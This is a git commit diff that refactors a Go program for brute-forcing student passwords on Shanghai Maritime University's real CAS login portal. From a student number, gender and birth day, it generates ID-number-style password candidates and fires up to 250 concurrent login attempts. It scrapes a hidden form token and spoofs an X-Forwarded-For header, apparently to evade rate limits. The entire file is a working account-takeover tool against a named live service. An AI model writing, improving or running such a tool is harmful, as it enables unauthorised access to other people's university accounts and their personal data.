e49612deafcb5c44b9ce3868658c1d8e4a3bbbd6
Calabash <calabash@CalabashdeMacBook-Pro.local>
2019-08-06 00:57:20 +0800

    feat: 代码调整

--- 海事大学密码/shmtu.go
+++ 海事大学密码/shmtu.go
@@ -1,145 +1,138 @@
 package main
 
 import (
+	"fmt"
+	"github.com/PuerkitoBio/goquery"
 	"net/http"
 	"net/url"
-	"fmt"
 	"strings"
-	"github.com/PuerkitoBio/goquery"
 	"sync"
 	"time"
 )
 
 const baseURL = "https://cas.shmtu.edu.cn/cas/login?service=https%3A%2F%2Fportal.shmtu.edu.cn%2Fnode"
+
 // 并发
-var limit = 400
+const limit = 250
+
 // 性别
 var isBoy = 1
+
 // 学号
-var stu_number string
+var stuNumber string
+
 // 默认1号出生
 var birthday = "01"
+
 // 结束信号
 var done string
 
-func main(){
+func main() {
 	// 获取用户输入
 	fmt.Printf("请输入学号:")
-	fmt.Scanln(&stu_number)
-	fmt.Printf("请输入性别(男为1,女为0):")
-	fmt.Scanln(&isBoy)
-	fmt.Printf("请输入生日(01-31,没有就回车):")
-	fmt.Scanln(&birthday)
-	// 生成密码列表
-	var list []string
-	ch := make(chan bool, limit)
-	var wg sync.WaitGroup
- for i:=0 ; i<320000 ; i++ {
- 	if i < 10 {
- 		list = append(list,fmt.Sprintf("%s000%d", birthday, i))
-		}
-		if i > 10 && i / 10 % 2 == isBoy {
-			if i < 100 && i >= 10 {
-				list = append(list,fmt.Sprintf("%s00%d", birthday, i))
-			}
-			if i < 1000 && i >= 100 {
-				list = append(list,fmt.Sprintf("%s0%d", birthday, i))
-			}
-			if i < 10000 && i >= 1000 {
-				list = append(list,fmt.Sprintf("%s%d", birthday, i))
-			}
-			// 如果没有提供出生日期
-			if birthday == "01" {
-				if i < 100000 && i >= 10000 {
-					list = append(list,fmt.Sprintf("0%d",i))
-				}
-				if i >= 100000 {
-					list = append(list,fmt.Sprintf("%d",i))
-				}
-			}
-		}
-	}
+	_, _ = fmt.Scanln(&stuNumber)
+	fmt.Printf("请输入性别(男为1, 女为0):")
+	_, _ = fmt.Scanln(&isBoy)
+	fmt.Printf("请输入生日(01-31, 没有就回车):")
+	_, _ = fmt.Scanln(&birthday)
 	startTime := time.Now()
-	section := len(list) / limit
-	lt, execution := getParam()
- Loop:
-  for i := 0; i < section; i++ {
-	  // 等待limit个协程执行完毕
-	  wg.Add(limit)
-	  for j := 1; j <= limit; j++ {
-		  go func(j int,ch chan<- bool) {
-			  defer wg.Done()
-			  if i*limit + j > len(list) {
-			    return
-			  }
-			  result := getResult(list[i*limit+j], lt, execution)
-			  if result != "" {
-				  fmt.Printf("密码找到啦!!!!!!!%s\n",result)
-				  ch <- true
-			  } else {
-				  ch <- false
-			  }
-		  }(j,ch)
-	  }
-	  wg.Wait()
-	  // 寻找成功信号
-	  for n := 0; n < limit; n++ {
-		  if <-ch {
-			   break Loop
-		  }
-	  }
-  }
+
+	var list = generatePassword(isBoy, birthday)
+	var execution = getParam()
+	var once sync.Once
+	result := make(chan string)
+	ch := make(chan struct{}, limit)
+
+	for _, v := range list {
+		ch <- struct{}{}
+		go func(password string, ch chan struct{}, result chan string) {
+			ok := getResult(stuNumber, password, execution)
+			if ok {
+				once.Do(func() {
+					result <- password
+				})
+			}
+			<-ch
+		}(v, ch, result)
+	}
+	fmt.Println(<- result)
 	endTime := time.Now()
 	fmt.Println(endTime.Sub(startTime))
-	fmt.Println("如果找到了多个密码- -,那就是网络问题,重试就完事了,我的代码不会有错的哼")
-	fmt.Println("如果你乱输参数找不到,我也不背锅")
 	fmt.Println("按任意键结束程序:")
-	fmt.Scanln(&done)
+	_, _ = fmt.Scanln(&done)
 }
-func getResult(pass string, lt string, execution string) string {
+
+// 验证密码, 请求返回200代表密码正确
+func getResult(username string, password string, execution string) (success bool) {
 	postValue := url.Values{
-		"signin": {"登录"},
-		"username": {stu_number},
-		"password": {pass},
-		"lt": {lt},
+		"username":  {username},
+		"password":  {password},
 		"execution": {execution},
-		"_eventId": {"submit"},
+		"_eventId":  {"submit"},
 	}
 	postString := postValue.Encode()
 	client := &http.Client{}
-	//提交请求
-	reqest, _ := http.NewRequest("POST", baseURL, strings.NewReader(postString))
-	//增加header选项
-	reqest.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-	resp, err := client.Do(reqest)
+	request, _ := http.NewRequest("POST", baseURL, strings.NewReader(postString))
+	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	request.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)")
+	request.Header.Add("X-Forwarded-For", "127.0.0.1")
+	request.Close = true
+
+	resp, err := client.Do(request)
 	if err != nil {
-		fmt.Println("请求出错")
-		return ""
+		return false
 	}
-	defer resp.Body.Close()
-	doc, err1 := goquery.NewDocumentFromReader(resp.Body)
-	if err1 != nil {
-		fmt.Println("解析出错")
-		return ""
-	}
-	res := doc.Find("#msg").Text()
-	if res != "认证信息无效。" {
-		return pass
-	} else {
-		fmt.Printf("%s错误\n",pass)
-		return ""
-	}
+	defer func() {
+		resp.Body.Close()
+		fmt.Println(resp.StatusCode, password)
+	}()
+
+	return resp.StatusCode == 200
 }
-func getParam() (execution string, lt string){
-	res, e1 := http.Get(baseURL)
-	if e1 != nil {
-		fmt.Println("获取参数错误")
+
+// 获取隐藏的表单值execution
+func getParam() (execution string) {
+	response, e := http.Get(baseURL)
+	if e != nil {
+		fmt.Println("网络错误: 获取execution失败", e)
 	}
-	defer res.Body.Close()
-	doc, _ := goquery.NewDocumentFromReader(res.Body)
-	ltDom := doc.Find("input[name='lt']")
+	defer response.Body.Close()
+
+	doc, _ := goquery.NewDocumentFromReader(response.Body)
 	executionDom := doc.Find("input[name='execution']")
-	lt, _= ltDom.Attr("value")
 	execution, _ = executionDom.Attr("value")
-	return lt, execution
+
+	return execution
+}
+
+func generatePassword(isOdd int, birthday string) []string {
+	var list []string
+
+	for i := 0; i < 320000; i++ {
+		if i / 10 % 2 != isOdd {
+			continue
+		}
+		if i < 10 {
+			list = append(list, fmt.Sprintf("%s000%d", birthday, i))
+		}
+		if i < 100 && i >= 10 {
+			list = append(list, fmt.Sprintf("%s00%d", birthday, i))
+		}
+		if i < 1000 && i >= 100 {
+			list = append(list, fmt.Sprintf("%s0%d", birthday, i))
+		}
+		if i < 10000 && i >= 1000 {
+			list = append(list, fmt.Sprintf("%s%d", birthday, i))
+		}
+		// 如果没有提供出生日期
+		if birthday == "01" {
+			if i < 100000 && i >= 10000 {
+				list = append(list, fmt.Sprintf("0%d",i))
+			}
+			if i >= 100000 {
+				list = append(list, fmt.Sprintf("%d",i))
+			}
+		}
+	}
+	return list
 }
